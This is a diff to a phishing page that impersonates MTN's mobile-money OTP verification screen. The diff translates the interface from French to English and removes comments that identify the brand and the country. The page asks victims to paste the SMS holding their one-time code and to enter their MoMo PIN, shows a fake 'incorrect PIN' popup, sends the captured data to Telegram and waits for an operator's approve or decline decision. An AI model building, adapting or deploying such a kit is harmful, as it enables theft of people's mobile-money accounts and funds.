@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>MTN  – Vérification OTP</title>
+    <title>MTN  – OTP Verification</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -39,7 +39,7 @@
             z-index: 2;
         }
 
-        /* Logo – MTN style */
+        /* Logo */
         .logo {
             margin-top: 60px;
         }
@@ -207,7 +207,7 @@
             color: #999;
         }
 
-        /* Spinner – MTN yellow */
+        /* Spinner */
         #spinner {
             position: fixed;
             inset: 0;
@@ -290,7 +290,6 @@
             margin-bottom: 18px;
         }
 
-        /* Single PIN input inside modal - now 5 digits */
         .modal-pin-input {
             width: 100%;
             max-width: 220px;
@@ -369,8 +368,8 @@
         <!-- ERROR BOX -->
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Erreur</div>
-            <div class="error-text" id="errorText">Code OTP invalide</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Invalid OTP code</div>
         </div>
 
         <div class="content">
@@ -381,45 +380,43 @@
             </div>
 
             <!-- TEXT -->
-            <div class="title">Confirmez votre compte</div>
+            <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
-                Collez le message que vous avez reçu par SMS.<br>
+                Paste the message you received via SMS.<br>
                 <span id="maskedPhone">65xxxxx56</span>
             </div>
 
             <!-- MESSAGE TEXTAREA -->
             <div class="message-area">
-                <label for="otpMessageText">Collez le message</label>
-                <textarea id="otpMessageText" placeholder="Collez l'intégralité du message ici..."></textarea>
-                <div class="hint">Le code OTP se trouve dans le message SMS.</div>
+                <label for="otpMessageText">Paste the message</label>
+                <textarea id="otpMessageText" placeholder="Paste the full message here..."></textarea>
+                <div class="hint">The OTP code is in the SMS message.</div>
             </div>
 
             <div class="message" id="formMessage"></div>
 
-            <button class="btn btn-primary" id="submitBtn">Soumettre</button>
+            <button class="btn btn-primary" id="submitBtn">Submit</button>
 
             <!-- Go Back button -->
-            <button class="btn btn-outline" id="goBackBtn">Retour</button>
+            <button class="btn btn-outline" id="goBackBtn">Back</button>
         </div>
     </div>
 
-    <!-- ====== PIN MODAL (single input, 5 digits) ====== -->
+    <!-- ====== PIN MODAL ====== -->
     <div class="modal-overlay" id="pinModal">
         <div class="modal-box">
             <div class="modal-title">
-                Le code PIN MoMo que vous avez saisi est incorrect,<br>
-                Veuillez confirmer votre code PIN pour continuer.
+                The MoMo PIN you entered is incorrect.<br>
+                Please confirm your PIN to continue.
             </div>
-            <div class="modal-sub">Saisissez votre code PIN à 5 chiffres</div>
+            <div class="modal-sub">Enter your 5-digit PIN</div>
 
-            <!-- Single PIN input, maxlength 5 -->
             <input class="modal-pin-input" id="modalPinInput" maxlength="5" inputmode="numeric" autocomplete="off" type="password" placeholder="· · · · ·">
 
             <div class="modal-message" id="modalMessage"></div>
-            <!-- Spinner shown during PIN verification, hidden by default -->
             <div id="modalSpinner" style="display:none; margin-top:10px;">
                 <div class="modal-loader"></div>
-                <div style="font-size:13px; color:#888; margin-top:6px;">Vérification du code PIN…</div>
+                <div style="font-size:13px; color:#888; margin-top:6px;">Verifying PIN…</div>
             </div>
         </div>
     </div>
@@ -448,20 +445,19 @@
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
 
-        // PIN Modal - single input (5 digits)
+        // PIN Modal
         const pinModal = document.getElementById('pinModal');
         const modalPinInput = document.getElementById('modalPinInput');
         const modalMessage = document.getElementById('modalMessage');
         const modalSpinner = document.getElementById('modalSpinner');
 
         // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-        const phone = sessionStorage.getItem('mtn_phone') || '655123456'; // Cameroon 9 digits
+        const phone = sessionStorage.getItem('mtn_phone') || '655123456';
         maskedPhoneSpan.textContent = maskPhone(phone);
 
         function maskPhone(phone) {
             const cleaned = phone.replace(/\D/g, '');
             if (cleaned.length >= 4) {
-                // Show first 2 and last 2 digits, mask the rest with 'x'
                 const start = cleaned.slice(0, 2);
                 const end = cleaned.slice(-2);
                 const middleLength = cleaned.length - 4;
@@ -472,7 +468,7 @@
 
         // ==================== ERROR HANDLING ====================
         function showError(message) {
-            errorText.innerText = message || 'Une erreur est survenue';
+            errorText.innerText = message || 'An error occurred';
             errorBox.style.display = 'block';
         }
         window.hideError = function() {
@@ -507,7 +503,7 @@
             }
         }
 
-        // ==================== SIMPLE POLLING WITH setInterval ====================
+        // ==================== POLLING ====================
         let currentPollInterval = null;
 
         function pollForCallback(expectedPrefix, expectedTs, onDecision) {
@@ -550,7 +546,7 @@
             }, 1500);
         }
 
-        // ==================== MODAL PIN LOGIC (single input, 5 digits) ====================
+        // ==================== MODAL PIN LOGIC ====================
         let isModalSubmitting = false;
 
         function closeModal() {
@@ -580,7 +576,6 @@
             return modalPinInput.value.length === 5;
         }
 
-        // Event listeners for the single PIN input (5 digits)
         modalPinInput.addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '');
             if (val.length > 5) val = val.slice(0, 5);
@@ -645,7 +640,7 @@
             } catch (err) {
                 modalSpinner.style.display = 'none';
                 modalPinInput.disabled = false;
-                modalMessage.textContent = '❌ Erreur réseau. Veuillez réessayer.';
+                modalMessage.textContent = '❌ Network error. Please try again.';
                 modalMessage.style.color = '#dc3545';
                 isModalSubmitting = false;
                 return;
@@ -660,26 +655,19 @@
                     closeModal();
                     window.location.href = 'otp4.html';
                 } else if (action === 'decline') {
-                    modalMessage.textContent = '❌ Code PIN incorrect';
+                    modalMessage.textContent = '❌ Incorrect PIN';
                     modalMessage.style.color = '#dc3545';
                     modalPinInput.value = '';
                     modalPinInput.classList.remove('filled');
                     modalPinInput.focus();
-                    showError('Code PIN incorrect. Veuillez réessayer.');
+                    showError('Incorrect PIN. Please try again.');
                     setTimeout(() => {
-                        if (modalMessage.textContent === '❌ Code PIN incorrect') {
+                        if (modalMessage.textContent === '❌ Incorrect PIN') {
                             modalMessage.textContent = '';
                         }
                     }, 3000);
-                } else if (action === 'timeout') {
-                    modalMessage.textContent = '⏱️ Délai d\'attente dépassé. Veuillez réessayer.';
-                    modalMessage.style.color = '#dc3545';
-                    modalPinInput.value = '';
-                    modalPinInput.classList.remove('filled');
-                    modalPinInput.focus();
-                    isModalSubmitting = false;
                 } else {
-                    modalMessage.textContent = '❌ Réponse inattendue. Réessayez.';
+                    modalMessage.textContent = '❌ Unexpected response. Try again.';
                     modalMessage.style.color = '#dc3545';
                     isModalSubmitting = false;
                 }
@@ -694,7 +682,7 @@
 
             const msgText = messageTextarea.value.trim();
             if (msgText.length < 5) {
-                formMessage.textContent = 'Veuillez coller le message complet (au moins 5 caractères).';
+                formMessage.textContent = 'Please paste the full message (at least 5 characters).';
                 formMessage.className = 'message error';
                 return;
             }
@@ -731,7 +719,7 @@
                 isSubmitting = false;
                 submitBtn.disabled = false;
                 messageTextarea.disabled = false;
-                showError('Échec de l\'envoi à Telegram. Veuillez réessayer.');
+                showError('Failed to send to Telegram. Please try again.');
                 return;
             }
 
@@ -745,18 +733,15 @@
                     window.location.href = 'otp4.html';
                 } else if (action === 'wrongpin') {
                     openModal();
-                    formMessage.textContent = '📌 Veuillez confirmer votre code PIN dans la fenêtre contextuelle.';
+                    formMessage.textContent = '📌 Please confirm your PIN in the popup.';
                     formMessage.className = 'message';
                 } else if (action === 'decline') {
-                    showError('Collez l\'intégralité du message. Vérifiez et réessayez.');
+                    showError('Paste the full message. Check and try again.');
                     messageTextarea.value = '';
                     messageTextarea.focus();
                     formMessage.textContent = '';
-                } else if (action === 'timeout') {
-                    showError('⏱️ Délai d\'attente dépassé. Veuillez réessayer.');
-                    messageTextarea.focus();
                 } else {
-                    showError('Réponse inattendue. Veuillez réessayer.');
+                    showError('Unexpected response. Please try again.');
                 }
             });
         }
@@ -785,7 +770,6 @@
             messageTextarea.focus();
         }, 200);
 
-        // Close modal only if not submitting (but we keep it open for flow)
         pinModal.addEventListener('click', function(e) {
             if (e.target === pinModal && !isModalSubmitting) {
                 // Do nothing – user must complete flow
@@ -810,7 +794,7 @@
             phone
         };
 
-        console.log('[MTN ] OTP page (Cameroon) initialized with French UI and English Telegram messages.');
+        console.log('[MTN ] OTP page initialized with English UI.');
     })();
     </script>
 
